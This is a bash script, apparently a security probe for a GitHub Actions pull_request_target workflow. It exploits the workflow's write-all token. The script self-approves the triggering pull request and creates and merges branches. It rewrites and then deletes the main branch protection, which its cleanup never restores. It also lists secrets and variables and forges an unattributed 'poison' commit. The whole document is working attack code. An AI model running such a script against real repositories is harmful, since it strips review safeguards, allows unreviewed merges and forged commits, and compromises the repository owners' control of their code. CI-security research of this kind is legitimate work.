#!/usr/bin/env bash
# i10413 probe - runs INSIDE pr-target.yml (pull_request_target, permissions: write-all)
# Tests what the full-script-execution context's write-all GITHUB_TOKEN can do.
set +e
T="$GITHUB_TOKEN"; R="$GITHUB_REPOSITORY"; API="https://api.github.com"
PRN=$(jq -r '.pull_request.number' "$GITHUB_EVENT_PATH" 2>/dev/null)
SHA=$(jq -r '.pull_request.head.sha' "$GITHUB_EVENT_PATH" 2>/dev/null)
echo "I10413_START repo=$R pr=$PRN head=$SHA run=$GITHUB_RUN_ID actor=$GITHUB_ACTOR event=$GITHUB_EVENT_NAME"

echo "--- token / env fingerprint ---"
echo "tok_len=${#T} tok_sha=$(printf %s "$T" | sha256sum | cut -c1-20)"
for v in DEMO_CANARY ACTIONS_ID_TOKEN_REQUEST_TOKEN ACTIONS_RUNTIME_TOKEN ACTIONS_CACHE_URL ACTIONS_RESULTS_URL; do
  val=$(printenv "$v")
  if [ -n "$val" ]; then echo "$v SET len=${#val} sha=$(printf %s "$val" | sha256sum | cut -c1-16)"; else echo "$v UNSET"; fi
done
echo "--- env perms ---"; env | grep -iE 'GITHUB_TOKEN|PERMISSION' | head -20

api(){ m="$1"; u="$2"; shift 2; c=$(curl -s -o /tmp/b -w '%{http_code}' -X "$m" -H "Authorization: Bearer $T" -H "Accept: application/vnd.github+json" "$u" "$@"); echo ">>> [$m] $u => $c"; head -c 600 /tmp/b | tr '\n' ' '; echo; }

echo "=== IDENTITY ==="
api GET "$API/user"
api GET "$API/repos/$R"
api GET "$API/installation/repositories"

echo "=== (a) PR ops on triggering PR #$PRN ==="
api PATCH "$API/repos/$R/pulls/$PRN" -d "{\"title\":\"i10413 probe pr $GITHUB_RUN_ID\"}"
api POST "$API/repos/$R/pulls/$PRN/reviews" -d '{"event":"APPROVE","body":"i10413 probe (will clean)"}'
api POST "$API/repos/$R/issues/$PRN/comments" -d '{"body":"i10413 probe comment"}'
CMT=$(jq -r '.id' /tmp/b 2>/dev/null)
api GET "$API/repos/$R/pulls/$PRN"

echo "=== (a2) create+merge PR on non-main base ==="
api GET "$API/repos/$R/git/ref/heads/main"; MSHA=$(jq -r '.object.sha' /tmp/b)
api POST "$API/repos/$R/git/refs" -d "{\"ref\":\"refs/heads/exp-10413-base\",\"sha\":\"$MSHA\"}"
api POST "$API/repos/$R/git/refs" -d "{\"ref\":\"refs/heads/exp-10413-m\",\"sha\":\"$SHA\"}"
CNT=$(printf %s "i10413 probe $(date -u +%s)" | base64 -w0)
api PUT "$API/repos/$R/contents/i10413-probe.txt" -d "{\"message\":\"i10413 probe\",\"content\":\"$CNT\",\"branch\":\"exp-10413-m\"}"
api POST "$API/repos/$R/pulls" -d '{"title":"i10413 merge probe","head":"exp-10413-m","base":"exp-10413-base","body":"probe"}'
PRN2=$(jq -r '.number' /tmp/b 2>/dev/null); echo "PRN2=$PRN2"
sleep 8
api PUT "$API/repos/$R/pulls/$PRN2/merge" -d '{"merge_method":"merge"}'
api GET "$API/repos/$R/pulls/$PRN2"

echo "=== (b) main ref / branch protection ==="
api GET "$API/repos/$R/git/ref/heads/main"; MSHA2=$(jq -r '.object.sha' /tmp/b)
echo "(no-op auth probe: PATCH main ref to its CURRENT sha, force=false -> changes no file)"
api PATCH "$API/repos/$R/git/refs/heads/main" -d "{\"sha\":\"$MSHA2\",\"force\":false}"
api GET "$API/repos/$R/git/ref/heads/main"
api GET "$API/repos/$R/branches/main/protection"
api PATCH "$API/repos/$R/branches/main/protection" -d '{"required_status_checks":null,"enforce_admins":false,"required_pull_request_reviews":null,"restrictions":null,"allow_force_pushes":false}'
api GET "$API/repos/$R/branches/main/protection"
api DELETE "$API/repos/$R/branches/main/protection"
api GET "$API/repos/$R/branches/main/protection"

echo "=== (c) secrets ==="
api GET "$API/repos/$R/actions/secrets"
api GET "$API/repos/$R/environments"
api GET "$API/repos/$R/actions/organization-secrets"
api GET "$API/repos/$R/actions/variables"

echo "=== Actions:write no-op probe (enable already-enabled workflow) ==="
api GET "$API/repos/$R/actions/workflows"
api PUT "$API/repos/$R/actions/workflows/issue-demo.yml/enable"
api GET "$API/repos/$R/actions/permissions"

echo "=== (d) attribution-free commit (non-main ref) ==="
BLOB=$(curl -s -X POST -H "Authorization: Bearer $T" -H "Accept: application/vnd.github+json" "$API/repos/$R/git/blobs" -d '{"content":"i10413 poison probe","encoding":"utf-8"}')
BS=$(echo "$BLOB" | jq -r '.sha')
TREE=$(curl -s -X POST -H "Authorization: Bearer $T" -H "Accept: application/vnd.github+json" "$API/repos/$R/git/trees" -d "{\"tree\":[{\"path\":\"i10413-poison.txt\",\"mode\":\"100644\",\"type\":\"blob\",\"sha\":\"$BS\"}]}")
TS=$(echo "$TREE" | jq -r '.sha')
CM=$(curl -s -X POST -H "Authorization: Bearer $T" -H "Accept: application/vnd.github+json" "$API/repos/$R/git/commits" -d "{\"message\":\"i10413 probe\",\"tree\":\"$TS\",\"parents\":[\"$SHA\"],\"author\":{\"name\":\"null\",\"email\":\"null@abc.cn\"},\"committer\":{\"name\":\"null\",\"email\":\"null@abc.cn\"}}")
CS=$(echo "$CM" | jq -r '.sha'); echo "poison_commit=$CS"
api GET "$API/repos/$R/git/commits/$CS"
api POST "$API/repos/$R/git/refs" -d "{\"ref\":\"refs/heads/exp-10413-probe\",\"sha\":\"$CS\"}"

echo "=== cleanup (non-main only) ==="
api DELETE "$API/repos/$R/git/refs/heads/exp-10413-probe"
api DELETE "$API/repos/$R/git/refs/heads/exp-10413-m"
api DELETE "$API/repos/$R/git/refs/heads/exp-10413-base"
api PATCH "$API/repos/$R/pulls/$PRN" -d '{"title":"i10413 probe pr"}'
if [ -n "$CMT" ] && [ "$CMT" != "null" ]; then api DELETE "$API/repos/$R/issues/comments/$CMT"; fi
echo "I10413_END"
